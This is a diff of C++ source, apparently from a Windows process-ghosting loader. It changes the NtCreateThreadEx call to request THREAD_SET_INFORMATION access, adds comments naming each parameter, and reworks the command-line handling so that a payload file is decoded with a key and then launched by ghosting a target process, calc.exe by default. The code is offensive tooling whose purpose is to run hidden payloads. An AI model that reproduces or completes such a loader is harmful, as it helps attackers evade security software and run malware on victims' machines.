@@ -165,16 +165,16 @@ bool process_ghost(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
 #endif
     HANDLE hThread = NULL;
     status = NtCreateThreadEx(&hThread,
-        THREAD_ALL_ACCESS,
-        NULL,
+        THREAD_SET_INFORMATION, //DesiredAccess
+        NULL, //ObjectAttributes
         hProcess,
-        (LPTHREAD_START_ROUTINE) procEntry,
-        NULL,
-        FALSE,
-        0,
-        0,
-        0,
-        NULL
+        (LPTHREAD_START_ROUTINE) procEntry, //StartRoutine
+        NULL, //Argument
+        FALSE, //CreateFlags
+        0, // ZeroBits
+        0, // StackSize
+        0, // MaximumStackSize
+        NULL //AttributeList
     );
 
     if (status != STATUS_SUCCESS) {
@@ -218,23 +218,27 @@ int wmain(int argc, wchar_t *argv[])
     wchar_t defaultTarget[MAX_PATH] = { 0 };
     get_calc_path(defaultTarget, MAX_PATH, is32bit);
     wchar_t *targetPath = defaultTarget;
-    if (argc >= 3) {
-        targetPath = argv[2];
+    if (argc >= 4) {
+        targetPath = argv[3];
+        std::cout << "[+] Target: " << targetPath << std::endl;
     }
     wchar_t *payloadPath = argv[1];
     size_t payloadSize = 0;
-    std::wstring wkey = argv[2];
-    std::string keyStr(wkey.begin(), wkey.end());
 
     BYTE* payladBuf = buffer_payload(payloadPath, payloadSize);
     if (payladBuf == NULL) {
         std::cerr << "Cannot read payload!" << std::endl;
         return -1;
     }
-    if (keyStr.length()) {
-        decode_payload(payladBuf, payloadSize, (BYTE*)keyStr.c_str(), keyStr.length());
-        std::cout << "[+] Decoded with key: " << keyStr << std::endl;
+    if (argc >= 3) {
+        std::wstring wkey = argv[2];
+        std::string keyStr(wkey.begin(), wkey.end());
+        if (keyStr.length()) {
+            decode_payload(payladBuf, payloadSize, (BYTE*)keyStr.c_str(), keyStr.length());
+            std::cout << "[+] Decoded with key: " << keyStr << std::endl;
+        }
     }
+
     bool is_ok = process_ghost(targetPath, payladBuf, (DWORD) payloadSize);
 
     free_buffer(payladBuf, payloadSize);
